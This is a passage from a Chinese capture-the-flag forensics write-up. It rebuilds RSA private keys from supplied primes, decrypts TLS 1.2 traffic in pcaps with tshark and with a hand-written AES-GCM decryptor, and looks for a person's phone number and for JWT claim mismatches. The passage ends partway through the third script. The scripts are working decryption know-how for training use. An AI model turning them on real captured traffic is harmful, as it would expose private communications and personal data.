+&lt;p&gt;RSA 核心是一对密钥，公钥：(n, e)，私钥：(n, d) 以及一些加速参数，&lt;code&gt;p&lt;/code&gt;和&lt;code&gt;q&lt;/code&gt;是两个大质数，RSA 的模数&lt;code&gt;n&lt;/code&gt;是&lt;code&gt;n = p x q&lt;/code&gt;，RSA的安全性依赖于只有&lt;code&gt;n&lt;/code&gt;很难分解出&lt;code&gt;p&lt;/code&gt;,&lt;code&gt;q&lt;/code&gt;。&lt;code&gt;e&lt;/code&gt;是公钥指数,常见值是&lt;code&gt;65537&lt;/code&gt;（十六进制0x10001），也可能是别的奇数。&lt;code&gt;d&lt;/code&gt;是私钥指数，&lt;code&gt;d ≡ e⁻¹ (mod φ(n))&lt;/code&gt;，欧拉函数&lt;code&gt;φ(n) = (p-1)(q-1)&lt;/code&gt;，所以只要知道 &lt;code&gt;p,q,e&lt;/code&gt;，就可以计算出&lt;code&gt;n&lt;/code&gt;和&lt;code&gt;d&lt;/code&gt;，从而完整重建私钥。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;计算模数：&lt;code&gt;n = p*q&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;计算欧拉函数：&lt;code&gt;φ = (p-1)*(q-1)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;计算模逆得到私钥指数：&lt;code&gt;d = e^{-1} mod φ&lt;/code&gt;，python中是&lt;code&gt;d = pow(e, -1, φ)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CRT 参数（非必要）：&lt;code&gt;dp = d mod (p-1)&lt;/code&gt;，&lt;code&gt;dq = d mod (q-1)&lt;/code&gt;，&lt;code&gt;iqmp = q^{-1} mod p&lt;/code&gt;（qInv）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import csv
+import struct
+import zipfile
+import hashlib
+from collections import defaultdict
+from pathlib import Path
+
+from cryptography import x509
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+
+
+# ---------------- RSA rebuild ----------------
+def load_row(params_csv: Path, target_id: int):
+    with open(params_csv, newline=&quot;&quot;, encoding=&quot;utf-8&quot;) as f:
+        r = csv.DictReader(f)
+        for row in r:
+            if int(row[&quot;id&quot;]) == target_id:
+                return int(row[&quot;e&quot;]), int(row[&quot;p&quot;]), int(row[&quot;q&quot;])
+    raise SystemExit(f&quot;[!] id={target_id} not found in {params_csv}&quot;)
+
+
+def build_rsa_private_key(p: int, q: int, e: int) -&amp;gt; rsa.RSAPrivateKey:
+    n = p * q
+    phi = (p - 1) * (q - 1)
+    d = pow(e, -1, phi)
+    dp = d % (p - 1)
+    dq = d % (q - 1)
+    iqmp = pow(q, -1, p)  # q^{-1} mod p
+
+    pub = rsa.RSAPublicNumbers(e=e, n=n)
+    priv = rsa.RSAPrivateNumbers(
+        p=p, q=q, d=d,
+        dmp1=dp, dmq1=dq, iqmp=iqmp,
+        public_numbers=pub
+    )
+    return priv.private_key()
+
+
+# ---------------- PCAP parsing (classic PCAP) ----------------
+def parse_ethernet_ipv4(frame: bytes) -&amp;gt; bytes | None:
+    if len(frame) &amp;lt; 14:
+        return None
+    eth_type = struct.unpack(&quot;!H&quot;, frame[12:14])[0]
+    if eth_type != 0x0800:
+        return None
+    return frame[14:]
+
+
+def parse_ipv4_tcp(pkt: bytes):
+    if len(pkt) &amp;lt; 20:
+        return None
+    vihl = pkt[0]
+    if (vihl &amp;gt;&amp;gt; 4) != 4:
+        return None
+    ihl = (vihl &amp;amp; 0x0F) * 4
+    if len(pkt) &amp;lt; ihl + 20:
+        return None
+    total_len = struct.unpack(&quot;!H&quot;, pkt[2:4])[0]
+    proto = pkt[9]
+    if proto != 6:
+        return None
+
+    src = pkt[12:16]
+    dst = pkt[16:20]
+    tcp = pkt[ihl:]
+    sport, dport = struct.unpack(&quot;!HH&quot;, tcp[:4])
+    seq = struct.unpack(&quot;!I&quot;, tcp[4:8])[0]
+    doff = (tcp[12] &amp;gt;&amp;gt; 4) * 4
+    if len(tcp) &amp;lt; doff:
+        return None
+
+    # total_len includes IP header
+    end = total_len - ihl
+    if end &amp;lt; doff:
+        payload = b&quot;&quot;
+    else:
+        payload = tcp[doff:end]
+    return (src, sport, dst, dport, seq, payload)
+
+
+def extract_tls_certs_from_stream(stream: bytes) -&amp;gt; list[bytes]:
+    &quot;&quot;&quot;
+    Parse TLS records -&amp;gt; handshake messages -&amp;gt; Certificate(11) -&amp;gt; DER cert list
+    &quot;&quot;&quot;
+    certs: list[bytes] = []
+    off = 0
+    while off + 5 &amp;lt;= len(stream):
+        content_type = stream[off]
+        rec_len = struct.unpack(&quot;!H&quot;, stream[off + 3:off + 5])[0]
+        rec = stream[off + 5:off + 5 + rec_len]
+        off += 5 + rec_len
+
+        if content_type != 22:  # handshake
+            continue
+
+        i = 0
+        while i + 4 &amp;lt;= len(rec):
+            hs_type = rec[i]
+            hs_len = int.from_bytes(rec[i + 1:i + 4], &quot;big&quot;)
+            body = rec[i + 4:i + 4 + hs_len]
+            i += 4 + hs_len
+
+            if hs_type != 11:  # Certificate
+                continue
+            if len(body) &amp;lt; 3:
+                continue
+
+            # certificate_list length (3 bytes)
+            j = 3
+            while j + 3 &amp;lt;= len(body):
+                clen = int.from_bytes(body[j:j + 3], &quot;big&quot;)
+                j += 3
+                cder = body[j:j + clen]
+                j += clen
+                if cder:
+                    certs.append(cder)
+    return certs
+
+
+def extract_moduli_from_pcap(pcap_bytes: bytes) -&amp;gt; set[tuple[int, int]]:
+    &quot;&quot;&quot;
+    Return set of (n, e) found in TLS Certificate messages inside this pcap.
+    Supports linktype Ethernet(1) and raw IPv4(228).
+    &quot;&quot;&quot;
+    if len(pcap_bytes) &amp;lt; 24:
+        return set()
+
+    magic = pcap_bytes[:4]
+    if magic == b&quot;\xd4\xc3\xb2\xa1&quot;:
+        endian = &quot;&amp;lt;&quot;
+    elif magic == b&quot;\xa1\xb2\xc3\xd4&quot;:
+        endian = &quot;&amp;gt;&quot;
+    else:
+        return set()
+
+    _, _, _, _, _, _, network = struct.unpack(endian + &quot;IHHIIII&quot;, pcap_bytes[:24])
+    off = 24
+
+    segments = defaultdict(dict)  # flow -&amp;gt; {seq: payload}
+
+    while off + 16 &amp;lt;= len(pcap_bytes):
+        ts_sec, ts_usec, incl_len, orig_len = struct.unpack(endian + &quot;IIII&quot;, pcap_bytes[off:off + 16])
+        off += 16
+        pkt = pcap_bytes[off:off + incl_len]
+        off += incl_len
+
+        if network == 1:  # Ethernet
+            pkt = parse_ethernet_ipv4(pkt) or b&quot;&quot;
+        elif network == 228:  # LINKTYPE_IPV4 (raw)
+            pass
+        else:
+            continue
+
+        if not pkt:
+            continue
+        parsed = parse_ipv4_tcp(pkt)
+        if not parsed:
+            continue
+        src, sport, dst, dport, seq, payload = parsed
+        if payload:
+            segments[(src, sport, dst, dport)][seq] = payload
+
+    moduli: set[tuple[int, int]] = set()
+    for flow, segs in segments.items():
+        stream = b&quot;&quot;.join(segs[k] for k in sorted(segs))
+        for der in extract_tls_certs_from_stream(stream):
+            try:
+                cert = x509.load_der_x509_certificate(der)
+                pub = cert.public_key()
+                if isinstance(pub, rsa.RSAPublicKey):
+                    nums = pub.public_numbers()
+                    moduli.add((nums.n, nums.e))
+            except Exception:
+                continue
+    return moduli
+
+
+def md5_name(name: str) -&amp;gt; str:
+    return hashlib.md5(name.encode(&quot;utf-8&quot;)).hexdigest()
+
+
+# ---------------- main ----------------
+def main():
+    ap = argparse.ArgumentParser(description=&quot;CTF: rebuild RSA key from params.csv and find which pcap matches.&quot;)
+    ap.add_argument(&quot;--params&quot;, required=True, help=&quot;params.csv path&quot;)
+    ap.add_argument(&quot;--pcapzip&quot;, required=True, help=&quot;pcap.zip path&quot;)
+    ap.add_argument(&quot;--id&quot;, type=int, default=285, help=&quot;target id (default: 285)&quot;)
+    ap.add_argument(&quot;--out-key&quot;, default=&quot;id285_key.pem&quot;, help=&quot;write rebuilt RSA private key PEM&quot;)
+    args = ap.parse_args()
+
+    e, p, q = load_row(Path(args.params), args.id)
+    n = p * q
+    print(f&quot;[*] id={args.id}: e={e}, n(bitlen)={n.bit_length()}&quot;)
+
+    priv = build_rsa_private_key(p, q, e)
+    pem = priv.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption(),
+    )
+    Path(args.out_key).write_bytes(pem)
+    print(f&quot;[+] wrote private key: {args.out_key}&quot;)
+
+    matches = []
+    with zipfile.ZipFile(args.pcapzip, &quot;r&quot;) as z:
+        for name in z.namelist():
+            if not name.lower().endswith(&quot;.pcap&quot;):
+                continue
+            b = z.read(name)
+            mods = extract_moduli_from_pcap(b)
+            if any(nn == n and ee == e for nn, ee in mods):
+                matches.append(Path(name).name)
+
+    if not matches:
+        print(&quot;[!] No matching pcap found.&quot;)
+    else:
+        print(&quot;[+] Matching pcap(s) and MD5(filename):&quot;)
+        for m in matches:
+            print(m, md5_name(m))
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行脚本得到答案。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;└─$ python solve_task1.py --params params.csv --pcapzip pcap.zip --id 285
+[*] id=285: e=65537, n(bitlen)=2048
+[+] wrote private key: id285_key.pem
+[+] Matching pcap(s) and MD5(filename):
+mAqY0WRHsV.pcap 1f5c34eab5696a300afff7452b7f7e6a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目2:&lt;/h4&gt;
+&lt;p&gt;证书解密。请根据上面的题目对每个流量包进行解密，并得到明文。请选手找到“王梅”的手机号，并进行答案提交。若找到“王梅”的手机号为15306364252,则提交答案为15306364252的32位小写MD5值如8ce2927e85dde243ec8ed0754fd7781f。&lt;/p&gt;
+&lt;p&gt;每个 pcap 中都有 TLS 握手报文，包含 Certificate。证书里包含 RSA 公钥 modulus：&lt;code&gt;n = p*q&lt;/code&gt;，题目给的&lt;code&gt;params.csv&lt;/code&gt;每行提供一组 (id, p, q, e)，所以流程是：从 pcap 中提取证书 DER，解析 X509 证书，取 RSA 公钥 modulus&lt;code&gt;n&lt;/code&gt;，在&lt;code&gt;params.csv&lt;/code&gt;中找到&lt;code&gt;n&lt;/code&gt;相同的那一行，即该 pcap 对应的 RSA 参数；由 (p,q,e) 反推私钥并导出 PEM，&lt;code&gt;phi = (p-1)(q-1)&lt;/code&gt;，&lt;code&gt;d = e^{-1} mod phi&lt;/code&gt;，计算 CRT 参数 dp,dq,qi，导出 PEM 私钥文件&lt;code&gt;idXXX.pem&lt;/code&gt;；在 Kali 上使用 tshark 解密 TLS，输出 follow stream 的明文；解密得到的明文可能出现多种编码形式：接出现：&lt;code&gt;王梅&lt;/code&gt;，Unicode 转义：&lt;code&gt;\\u738b\\u6885&lt;/code&gt;，URL 编码：&lt;code&gt;%5Cu738b%5Cu6885&lt;/code&gt;。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;tshark 4.6.0 中旧的 tls.keys_list 已被标记为 obsolete，采用新的 RSA Keys UAT 配置方式
+-o uat:rsa_keys:&quot;/abs/path/key.pem&quot;,&quot;&quot;
+-z follow,tls,utf-8,&amp;lt;tcp.stream&amp;gt;
+使用 -2（two-pass）提高 TCP 重组与解密稳定性&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;读取 params.csv，建立 n -&amp;gt; (id,e,p,q) 映射&lt;/li&gt;
+&lt;li&gt;遍历所有 pcap：&lt;code&gt;tshark -Y tls.handshake.type==11 -e tls.handshake.certificate&lt;/code&gt;提取证书，解析证书获取&lt;code&gt;modulus&lt;/code&gt;，匹配 params 行并生成私钥 PEM&lt;/li&gt;
+&lt;li&gt;列出该 pcap 中包含 TLS 的 TCP 流（&lt;code&gt;tcp.stream&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;对每个流执行：&lt;code&gt;tshark -2 -o uat:rsa_keys:&quot;key.pem&quot;,&quot;&quot; -z follow,tls,utf-8,&amp;lt;stream&amp;gt;&lt;/code&gt;，保存明文到&lt;code&gt;out_task2/decrypted/*.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;在明文中查找“王梅”，命中后提取手机号并输出 MD5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse, csv, hashlib, re, subprocess
+from pathlib import Path
+from urllib.parse import unquote
+
+from cryptography import x509
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+PHONE_RE = re.compile(r&quot;\b1\d{10}\b&quot;)
+
+def run(cmd):
+    p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    return p.returncode, p.stdout, p.stderr
+
+def load_params(params_csv: Path):
+    n_map = {}
+    with params_csv.open(&quot;r&quot;, encoding=&quot;utf-8&quot;, newline=&quot;&quot;) as f:
+        r = csv.DictReader(f)
+        for row in r:
+            _id = int(row[&quot;id&quot;])
+            e = int(row[&quot;e&quot;])
+            p = int(row[&quot;p&quot;])
+            q = int(row[&quot;q&quot;])
+            n_map[p*q] = (_id, e, p, q)
+    return n_map
+
+def extract_leaf_cert_der(pcap: Path):
+    _, out, _ = run([
+        &quot;tshark&quot;, &quot;-r&quot;, str(pcap),
+        &quot;-Y&quot;, &quot;tls.handshake.type==11&quot;,
+        &quot;-T&quot;, &quot;fields&quot;,
+        &quot;-e&quot;, &quot;tls.handshake.certificate&quot;
+    ])
+    out = out.strip()
+    if not out:
+        return None
+    line = next((ln for ln in out.splitlines() if ln.strip()), &quot;&quot;)
+    if not line:
+        return None
+    first = line.split(&quot;,&quot;)[0].replace(&quot;:&quot;, &quot;&quot;).strip()
+    if not first:
+        return None
+    try:
+        return bytes.fromhex(first)
+    except ValueError:
+        return None
+
+def cert_modulus_n(der: bytes):
+    cert = x509.load_der_x509_certificate(der)
+    pub = cert.public_key()
+    if not isinstance(pub, rsa.RSAPublicKey):
+        return None
+    return pub.public_numbers().n
+
+def build_rsa_private_key_pem(e: int, p: int, q: int) -&amp;gt; bytes:
+    n = p*q
+    phi = (p-1)*(q-1)
+    d = pow(e, -1, phi)
+    dp = d % (p-1)
+    dq = d % (q-1)
+    qi = pow(q, -1, p)
+
+    pub = rsa.RSAPublicNumbers(e=e, n=n)
+    priv = rsa.RSAPrivateNumbers(
+        p=p, q=q, d=d, dmp1=dp, dmq1=dq, iqmp=qi, public_numbers=pub
+    ).private_key()
+
+    return priv.private_bytes(
+        serialization.Encoding.PEM,
+        serialization.PrivateFormat.TraditionalOpenSSL,
+        serialization.NoEncryption()
+    )
+
+def has_app_data(pcap: Path) -&amp;gt; bool:
+    _, out, _ = run([
+        &quot;tshark&quot;, &quot;-r&quot;, str(pcap),
+        &quot;-Y&quot;, &quot;tls.record.content_type==23&quot;,
+        &quot;-T&quot;, &quot;fields&quot;,
+        &quot;-e&quot;, &quot;frame.number&quot;
+    ])
+    return bool(out.strip())
+
+def list_tcp_streams_with_tls(pcap: Path):
+    _, out, _ = run([
+        &quot;tshark&quot;, &quot;-r&quot;, str(pcap),
+        &quot;-Y&quot;, &quot;tls&quot;,
+        &quot;-T&quot;, &quot;fields&quot;,
+        &quot;-e&quot;, &quot;tcp.stream&quot;
+    ])
+    out = out.strip()
+    if not out:
+        return []
+    return sorted({int(x) for x in out.splitlines() if x.strip().isdigit()})
+
+def follow_tls_with_uat_key(pcap: Path, key_abs: str, tcp_stream: int):
+    # kali TShark (Wireshark) 4.6.0.
+    uat = f&apos;uat:rsa_keys:&quot;{key_abs}&quot;,&quot;&quot;&apos;
+    _, out, err = run([
+        &quot;tshark&quot;, &quot;-2&quot;,
+        &quot;-r&quot;, str(pcap),
+        &quot;-o&quot;, uat,
+        &quot;-q&quot;,
+        &quot;-z&quot;, f&quot;follow,tls,utf-8,{tcp_stream}&quot;,
+    ])
+    return out, err
+
+def normalize_variants(s: str, rounds=2):
+    vars = {s}
+    def uni_unescape(x: str) -&amp;gt; str:
+        try:
+            return x.encode(&quot;utf-8&quot;, errors=&quot;ignore&quot;).decode(&quot;unicode_escape&quot;, errors=&quot;ignore&quot;)
+        except Exception:
+            return x
+    for _ in range(rounds):
+        new = set()
+        for v in list(vars):
+            new.add(unquote(v))
+            new.add(uni_unescape(v))
+        vars |= new
+    return list(vars)
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument(&quot;--params&quot;, required=True)
+    ap.add_argument(&quot;--pcapdir&quot;, required=True)
+    ap.add_argument(&quot;--name&quot;, default=&quot;王梅&quot;)
+    ap.add_argument(&quot;--outdir&quot;, default=&quot;out_task2&quot;)
+    args = ap.parse_args()
+
+    params_csv = Path(args.params)
+    pcapdir = Path(args.pcapdir)
+    outdir = Path(args.outdir)
+    keydir = outdir / &quot;keys&quot;
+    decdir = outdir / &quot;decrypted&quot;
+    keydir.mkdir(parents=True, exist_ok=True)
+    decdir.mkdir(parents=True, exist_ok=True)
+
+    n_map = load_params(params_csv)
+    pcaps = sorted(pcapdir.glob(&quot;*.pcap&quot;))
+    if not pcaps:
+        raise SystemExit(&quot;No pcaps found&quot;)
+
+    # name 可能以转义形式出现
+    name_variants = {args.name, &quot;\\u738b\\u6885&quot;, &quot;%5Cu738b%5Cu6885&quot;}
+
+    for pcap in pcaps:
+        if not has_app_data(pcap):
+            continue
+
+        der = extract_leaf_cert_der(pcap)
+        if not der:
+            continue
+        n = cert_modulus_n(der)
+        if not n or n not in n_map:
+            continue
+
+        _id, e, p, q = n_map[n]
+        key_path = keydir / f&quot;id{_id}.pem&quot;
+        if not key_path.exists():
+            key_path.write_bytes(build_rsa_private_key_pem(e, p, q))
+        key_abs = str(key_path.resolve())
+
+        streams = list_tcp_streams_with_tls(pcap)
+        if not streams:
+            continue
+
+        for s in streams:
+            text, err = follow_tls_with_uat_key(pcap, key_abs, s)
+            (decdir / f&quot;{pcap.stem}.stream{s}.txt&quot;).write_text(text, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;)
+
+            for v in normalize_variants(text, rounds=2):
+                if any(nv in v for nv in name_variants):
+                    m = PHONE_RE.search(v)
+                    if m:
+                        phone = m.group(0)
+                        md5 = hashlib.md5(phone.encode()).hexdigest()
+                        print(f&quot;[+] FOUND in {pcap.name}&quot;)
+                        print(f&quot;    phone: {phone}&quot;)
+                        print(f&quot;    md5  : {md5}&quot;)
+                        return
+
+    print(&quot;[-] Not found&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到对应包和手机号md5值。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ python solve_task2.py --params ./params.csv --pcapdir ./pcap
+[+] FOUND in ZQYTMYb2ZY.pcap
+    phone: 13930079365
+    md5  : 5a4df03b5f1aaad3f465fc78a84b7101
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;题目3:&lt;/h4&gt;
+&lt;p&gt;数据核验。为了安全可靠，该系统在请求包设置了Authorization头部字段。该字段是使用JWT进行加密的，每个人的密钥为了安全考虑设置成自己姓名的拼音。请选手解密JWT身份认证核对信息是否与请求体中的内容是否一致。若非一致，该用户可能在进行越权访问。请选手统计出有多少个账号进行越权。若有101个账号进行越权，则答案提交为101的32位小写MD5值如38b3eff8baf56627478ec76a704e9b52。&lt;/p&gt;
+&lt;p&gt;基于解密后的HTTP明文继续处理，&lt;code&gt;HTTP Header：Authorization: Bearer &amp;lt;JWT&amp;gt;&lt;/code&gt;，&lt;code&gt;HTTP Body：JSON 请求体（包含 username/phone 等字段）&lt;/code&gt;，JWT 的格式固定为：&lt;code&gt;header.payload.signature&lt;/code&gt;，其中&lt;code&gt;header&lt;/code&gt;与&lt;code&gt;payload&lt;/code&gt;均为base64url编码的&lt;code&gt;JSON&lt;/code&gt;，提取&lt;code&gt;Authorization&lt;/code&gt;中的&lt;code&gt;JWT&lt;/code&gt;，对&lt;code&gt;JWT&lt;/code&gt;的第二段&lt;code&gt;payload&lt;/code&gt;做base64url解码，&lt;code&gt;json.loads()&lt;/code&gt;得到payload字典，若&lt;code&gt;payload[&quot;username&quot;] != body[&quot;username&quot;]&lt;/code&gt;或&lt;code&gt;payload[&quot;phone&quot;] != body[&quot;phone&quot;]&lt;/code&gt;认为该账号存在越权行为，根据题目，对越权账号去重。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;遍历 500 个pcap，逐个得到HTTP明文&lt;/li&gt;
+&lt;li&gt;用正则从&lt;code&gt;headers&lt;/code&gt;提取&lt;code&gt;JWT&lt;/code&gt;：&lt;code&gt;Authorization: Bearer &amp;lt;token&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;从明文body解析JSON&lt;/li&gt;
+&lt;li&gt;JWT payload 解析：&lt;code&gt;payload = json.loads(base64url_decode(jwt.split(&apos;.&apos;)[1]))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;比对字段&lt;code&gt;username/phone&lt;/code&gt;：不一致则将&lt;code&gt;payload[&quot;username&quot;]&lt;/code&gt;记录到&lt;code&gt;over_users&lt;/code&gt;集合&lt;/li&gt;
+&lt;li&gt;最终输出：越权账号去重数量&lt;code&gt;len(over_users)&lt;/code&gt;,该数量的 MD5（32位小写）,越权账号名单。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import base64
+import csv
+import hashlib
+import hmac
+import ipaddress
+import json
+import re
+import struct
+from collections import defaultdict
+from pathlib import Path
+
+from cryptography import x509
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+PHONE_RE = re.compile(r&quot;\b1\d{10}\b&quot;)
+
+
+def b64url_decode(s: str) -&amp;gt; bytes:
+    b = s.encode()
+    b += b&quot;=&quot; * ((4 - len(b) % 4) % 4)
+    return base64.urlsafe_b64decode(b)
+
+
+def p_hash(secret: bytes, seed: bytes, out_len: int):
+    out = b&quot;&quot;
+    A = seed
+    while len(out) &amp;lt; out_len:
+        A = hmac.new(secret, A, hashlib.sha256).digest()
+        out += hmac.new(secret, A + seed, hashlib.sha256).digest()
+    return out[:out_len]
+
+
+def tls_prf(secret: bytes, label: str, seed: bytes, out_len: int) -&amp;gt; bytes:
+    return p_hash(secret, label.encode() + seed, out_len)
+
+
+def parse_pcap_tcp_streams(pcap_bytes: bytes) -&amp;gt; dict:
+    magic = pcap_bytes[:4]
+    if magic == b&quot;\xd4\xc3\xb2\xa1&quot;:
+        endian = &quot;&amp;lt;&quot;
+    elif magic == b&quot;\xa1\xb2\xc3\xd4&quot;:
+        endian = &quot;&amp;gt;&quot;
+    else:
+        raise ValueError(&quot;Unsupported pcap magic (need pcap, not pcapng)&quot;)
+
+    network = struct.unpack(endian + &quot;IHHIIII&quot;, pcap_bytes[:24])[-1]
+    off = 24
+    segments = defaultdict(dict)
+
+    while off + 16 &amp;lt;= len(pcap_bytes):
+        ts_sec, ts_usec, incl_len, orig_len = struct.unpack(endian + &quot;IIII&quot;, pcap_bytes[off:off + 16])
+        off += 16
+        pkt = pcap_bytes[off:off + incl_len]
+        off += incl_len
+
+        # Ethernet
+        if network == 1:
+            if len(pkt) &amp;lt; 14:
+                continue
+            eth_type = struct.unpack(&quot;!H&quot;, pkt[12:14])[0]
+            if eth_type != 0x0800:
+                continue
+            pkt = pkt[14:]
+        # raw IPv4
+        elif network == 228:
+            pass
+        else:
+            continue
+
+        if len(pkt) &amp;lt; 20:
+            continue
+        vihl = pkt[0]
+        if (vihl &amp;gt;&amp;gt; 4) != 4:
+            continue
+        ihl = (vihl &amp;amp; 0x0F) * 4
+        if len(pkt) &amp;lt; ihl + 20:
+            continue
+
+        total_len = struct.unpack(&quot;!H&quot;, pkt[2:4])[0]
+        if pkt[9] != 6:
+            continue
+
+        src = pkt[12:16]
+        dst = pkt[16:20]
+        tcp = pkt[ihl:]
+        sport, dport = struct.unpack(&quot;!HH&quot;, tcp[:4])
+        seq = struct.unpack(&quot;!I&quot;, tcp[4:8])[0]
+        doff = (tcp[12] &amp;gt;&amp;gt; 4) * 4
+        if len(tcp) &amp;lt; doff:
+            continue
+
+        end = total_len - ihl
+        payload = tcp[doff:end] if end &amp;gt;= doff else b&quot;&quot;
+        if payload:
+            segments[(src, sport, dst, dport)][seq] = payload
+
+    streams = {}
+    for flow, segs in segments.items():
+        streams[flow] = b&quot;&quot;.join(segs[k] for k in sorted(segs))
+    return streams
+
+
+def iter_tls_records(stream: bytes):
+    off = 0
+    while off + 5 &amp;lt;= len(stream):
+        ctype = stream[off]
+        ver = stream[off + 1:off + 3]
+        rlen = struct.unpack(&quot;!H&quot;, stream[off + 3:off + 5])[0]
+        if off + 5 + rlen &amp;gt; len(stream):
+            break
+        frag = stream[off + 5:off + 5 + rlen]
+        yield ctype, ver, frag
+        off += 5 + rlen
+
+
+def parse_handshake_messages(stream: bytes):
+    buf = b&quot;&quot;
+    for ctype, ver, frag in iter_tls_records(stream):
+        if ctype != 22:
+            continue
+        buf += frag
+        i = 0
+        while i + 4 &amp;lt;= len(buf):
+            hs_type = buf[i]
+            hs_len = int.from_bytes(buf[i + 1:i + 4], &quot;big&quot;)
+            if i + 4 + hs_len &amp;gt; len(buf):
+                break
+            body = buf[i + 4:i + 4 + hs_len]
+            yield hs_type, body, ver
+            i += 4 + hs_len
+        buf = buf[i:]
+
+
+def parse_client_hello(body: bytes):
+    # version(2) + random(32) ...
+    return body[:2], body[2:34]
+
+
+def parse_server_hello(body: bytes):
+    # version(2) + random(32) + session_id_len(1) + session_id + cipher_suite(2) ...
+    ver = body[:2]
+    rnd = body[2:34]
+    sid_len = body[34]
+    idx = 35 + sid_len
+    csuite = struct.unpack(&quot;!H&quot;, body[idx:idx + 2])[0]
+    return ver, rnd, csuite
+
+
+def extract_first_cert_from_certmsg(body: bytes) -&amp;gt; bytes:
+    # certificate_list length(3) then first cert len(3) + der
+    j = 3
+    clen = int.from_bytes(body[j:j + 3], &quot;big&quot;)
+    j += 3
+    return body[j:j + clen]
+
+
+def parse_client_key_exchange_rsa(body: bytes) -&amp;gt; bytes:
+    l = struct.unpack(&quot;!H&quot;, body[:2])[0]
+    return body[2:2 + l]
+
+
+def extract_http_from_pcap(pcap_path: Path, n_map: dict) -&amp;gt; str | None:
+    streams = parse_pcap_tcp_streams(pcap_path.read_bytes())
+
+    # client-&amp;gt;server: dport 443 ; server-&amp;gt;client: sport 443
+    try:
+        client_flow = next(f for f in streams if f[3] == 443)
+        server_flow = next(f for f in streams if f[1] == 443)
+    except StopIteration:
+        return None
+
+    cstream = streams[client_flow]
+    sstream = streams[server_flow]
+
+    cmsgs = list(parse_handshake_messages(cstream))
+    smsgs = list(parse_handshake_messages(sstream))
+
+    try:
+        ch = next(b for t, b, v in cmsgs if t == 1)
+        ck = next(b for t, b, v in cmsgs if t == 16)
+        sh = next(b for t, b, v in smsgs if t == 2)
+        certmsg = next(b for t, b, v in smsgs if t == 11)
+    except StopIteration:
+        return None
+
+    _, crand = parse_client_hello(ch)
+    ver, srand, csuite = parse_server_hello(sh)
+
+    # 本题样本里是 TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)
+    if csuite != 0x009c or ver != b&quot;\x03\x03&quot;:
+        return None
+
+    der = extract_first_cert_from_certmsg(certmsg)
+    cert = x509.load_der_x509_certificate(der)
+    pub = cert.public_key().public_numbers()
+    if pub.n not in n_map:
+        return None
+    _id, e, p, q = n_map[pub.n]
+
+    # build RSA privkey
+    phi = (p - 1) * (q - 1)
+    d = pow(e, -1, phi)
+    dp = d % (p - 1)
+    dq = d % (q - 1)
+    qi = pow(q, -1, p)
+    priv = rsa.RSAPrivateNumbers(
+        p=p, q=q, d=d, dmp1=dp, dmq1=dq, iqmp=qi,
+        public_numbers=rsa.RSAPublicNumbers(e=e, n=pub.n)
+    ).private_key()
+
+    enc_pms = parse_client_key_exchange_rsa(ck)
+    pms = priv.decrypt(enc_pms, padding.PKCS1v15())
+
+    master = tls_prf(pms, &quot;master secret&quot;, crand + srand, 48)
+    key_block = tls_prf(master, &quot;key expansion&quot;, srand + crand, 40)
+
+    client_key = key_block[:16]
+    client_fixed_iv = key_block[32:36]
+    aesgcm = AESGCM(client_key)
+
+    # decrypt records after CCS
+    recs = list(iter_tls_records(cstream))
+    after = False
+    enc_records = []
+    for ctype, v, frag in recs:
+        if after:
+            enc_records.append((ctype, v, frag))
+        if ctype == 20:  # ChangeCipherSpec
+            after = True
+
+    if not enc_records:
+        return None
+
+    seq = 0
+    out = b&quot;&quot;
+    for ctype, v, frag in enc_records:
+        # TLS1.2 GCM: explicit nonce(8) + ciphertext+tag
+        explicit = frag[:8]
+        ciphertext = frag[8:]
+        pt_len = len(ciphertext) - 16
+        aad = seq.to_bytes(8, &quot;big&quot;) + bytes([ctype]) + v + pt_len.to_bytes(2, &quot;big&quot;)
+        nonce = client_fixed_iv + explicit
+        pt = aesgcm.decrypt(nonce, ciphertext, aad)
+
+        if ctype == 23:  # application_data
+            out += pt
+        seq += 1
+
+    return out.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
+
+
+def extract_jwt_and_body(http_text: str):
+    parts = http_text.split(&quot;\r\n\r\n&quot;, 1)
+    if len(parts) != 2:
+        parts = http_text.split(&quot;\n\n&quot;, 1)
+        if len(parts) != 2:
+            return None
+    headers, body = parts
